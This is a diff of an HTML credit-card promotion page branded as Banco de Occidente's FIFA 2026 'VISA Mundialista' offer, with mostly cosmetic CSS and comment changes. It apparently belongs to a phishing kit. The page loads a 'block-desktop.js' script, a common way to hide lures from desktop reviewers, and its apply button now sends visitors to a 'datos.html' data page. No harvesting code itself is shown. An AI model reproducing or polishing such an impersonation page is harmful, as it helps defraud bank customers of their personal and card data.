@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Banco de Occidente - Copa Mundial FIFA 2026</title>
-    <script src="BlockDesktop.js"></script>
+    <script src="block-desktop.js"></script>
     <style>
         * {
             margin: 0;
@@ -470,68 +470,56 @@
         }
 
         /* Responsive */
- 
         @media (max-width: 768px) {
-    .hero {
-        min-height: 300px;
-    }
+            .hero {
+                min-height: 300px;
+            }
 
-    .hero-content {
-        position: absolute;
-        left: 20px;
-        bottom: 30px;
-        width: 45%;
-        height: auto;
-        padding: 0;
-        justify-content: flex-end;
-        align-items: flex-start;
-    }
+            .hero-content {
+                padding: 20px;
+                justify-content: flex-end;
+            }
 
-    .hero-subtitle {
-        font-size: 13px;
-        margin-bottom: 8px;
-    }
+            .hero-text h1 {
+                font-size: 24px;
+                max-width: 100%;
+                margin-bottom: 20px;
+            }
 
-    .hero-text h1 {
-        font-size: 20px;
-        line-height: 1.2;
-        max-width: 100%;
-        margin-bottom: 15px;
-    }
+            .hero-cta {
+                padding: 12px 24px;
+                font-size: 13px;
+                margin-bottom: 40px;
+            }
 
-    .hero-cta {
-        padding: 10px 20px;
-        font-size: 13px;
-    }
+            .beneficios-header h2 {
+                font-size: 24px;
+            }
 
-    .beneficios-header h2 {
-        font-size: 24px;
-    }
+            .beneficios-grid {
+                grid-template-columns: 1fr;
+            }
 
-    .beneficios-grid {
-        grid-template-columns: 1fr;
-    }
+            .mundial-content h2 {
+                font-size: 28px;
+            }
 
-    .mundial-content h2 {
-        font-size: 28px;
-    }
+            .credit-card-destacados {
+                grid-template-columns: 1fr;
+            }
 
-    .credit-card-destacados {
-        grid-template-columns: 1fr;
-    }
+            .credit-card-image {
+                min-height: 200px;
+            }
 
-    .credit-card-image {
-        min-height: 200px;
-    }
+            .credit-card-destacados .credit-card-content {
+                padding: 24px;
+            }
 
-    .credit-card-destacados .credit-card-content {
-        padding: 24px;
-    }
-
-    .tabs {
-        gap: 8px;
-    }
-}
+            .tabs {
+                gap: 8px;
+            }
+        }
     </style>
 </head>
 <body>
@@ -548,10 +536,10 @@
     <!-- Hero Section con Luis Díaz -->
     <section class="hero">
         <div class="hero-content">
+            <p class="hero-subtitle">¡Tienes que tenerla!</p>
             <div class="hero-text">
-                <p class="hero-subtitle">¡Tienes que tenerla!</p>
                 <h1>Solicita y utiliza tu tarjeta VISA Mundialista.</h1>
-                <button class="hero-cta" onclick="window.location.href='or.html'">Solicítala ya</button>
+                <button class="hero-cta" onclick="window.location.href='datos.html'">Solicítala ya</button>
             </div>
         </div>
     </section>
@@ -561,13 +549,8 @@
         <div class="mundial-content">
             <div class="mundial-badge">
                 <svg viewBox="0 0 120 80" xmlns="http://www.w3.org/2000/svg" style="width: 100%; height: 100%;">
-                    <!-- Tarjeta de fondo -->
                     <rect x="10" y="10" width="100" height="60" rx="4" fill="white" stroke="currentColor" stroke-width="1.5"/>
-                    
-                    <!-- Banda magnética -->
                     <rect x="10" y="35" width="100" height="12" fill="#222"/>
-                    
-                    <!-- Chip -->
                     <g transform="translate(25, 20)">
                         <rect width="12" height="12" rx="1.5" fill="#FFD700" stroke="#DAA520" stroke-width="0.5"/>
                         <g stroke="#DAA520" stroke-width="0.4" fill="none">
@@ -576,20 +559,12 @@
                             <line x1="2" y1="9" x2="10" y2="9"/>
                         </g>
                     </g>
-                    
-                    <!-- Logo VISA -->
                     <text x="60" y="28" font-size="8" font-weight="bold" fill="#0052CC" font-family="Arial">VISA</text>
-                    
-                    <!-- Número de tarjeta (puntos) -->
                     <circle cx="20" cy="50" r="1.5" fill="#0052CC"/>
                     <circle cx="30" cy="50" r="1.5" fill="#0052CC"/>
                     <circle cx="40" cy="50" r="1.5" fill="#0052CC"/>
                     <circle cx="50" cy="50" r="1.5" fill="#0052CC"/>
-                    
-                    <!-- Mundialista -->
                     <text x="15" y="62" font-size="6" font-weight="600" fill="#0052CC" font-family="Arial">MUNDIALISTA</text>
-                    
-                    <!-- Gráfico de onda/movimiento -->
                     <path d="M 70 48 L 75 46 L 80 50 L 85 44 L 90 52" stroke="#0052CC" stroke-width="1" fill="none" stroke-linecap="round"/>
                 </svg>
             </div>
@@ -607,7 +582,6 @@
         </div>
 
         <div class="beneficios-grid">
-            <!-- Beneficio 1 -->
             <div class="beneficio-card">
                 <div class="beneficio-icon">
                     <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
@@ -620,7 +594,6 @@
                 <p>No pagas los primeros 4 meses después de tu compra</p>
             </div>
 
-            <!-- Beneficio 2 -->
             <div class="beneficio-card">
                 <div class="beneficio-icon">
                     <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
@@ -633,7 +606,6 @@
                 <p>Recupera hasta 5% en cada transacción realizada</p>
             </div>
 
-            <!-- Beneficio 3 -->
             <div class="beneficio-card">
                 <div class="beneficio-icon">
                     <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
@@ -645,7 +617,6 @@
                 <p>Seguro de fraude y protección en todas tus compras</p>
             </div>
 
-            <!-- Beneficio 4 -->
             <div class="beneficio-card">
                 <div class="beneficio-icon">
                     <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
@@ -660,7 +631,6 @@
                 <p>Entradas prioritarias y descuentos a eventos mundialistas</p>
             </div>
 
-            <!-- Beneficio 5 -->
             <div class="beneficio-card">
                 <div class="beneficio-icon">
                     <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
@@ -674,7 +644,6 @@
                 <p>Úsala en millones de establecimientos en el mundo</p>
             </div>
 
-            <!-- Beneficio 6 -->
             <div class="beneficio-card">
                 <div class="beneficio-icon">
                     <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
@@ -708,11 +677,10 @@
             <button class="tab" onclick="switchTab(event, 'tarjetas')">Tarjetas</button>
         </div>
 
-        <!-- Tab: Destacados -->
         <div id="destacados" class="tab-content active">
             <div class="credit-card-destacados">
                 <div class="credit-card-image">
-                    <img src="tarjeta.png" alt="Tarjeta Mundialista" style="width: 100%; height: auto; border-radius: 8px;">
+                    <img src="tarjeta.png" alt="Tarjeta Mundialista" style="width: 100%; height: auto;">
                 </div>
                 <div class="credit-card-content">
                     <h3>Hecho a tu medida</h3>
@@ -723,7 +691,6 @@
             </div>
         </div>
 
-        <!-- Tab: Créditos -->
         <div id="creditos" class="tab-content">
             <div class="credit-card">
                 <div class="credit-card-content">
@@ -735,7 +702,6 @@
             </div>
         </div>
 
-        <!-- Tab: Cuentas -->
         <div id="cuentas" class="tab-content">
             <div class="credit-card">
                 <div class="credit-card-content">
@@ -747,7 +713,6 @@
             </div>
         </div>
 
-        <!-- Tab: Tarjetas -->
         <div id="tarjetas" class="tab-content">
             <div class="credit-card">
                 <div class="credit-card-content">
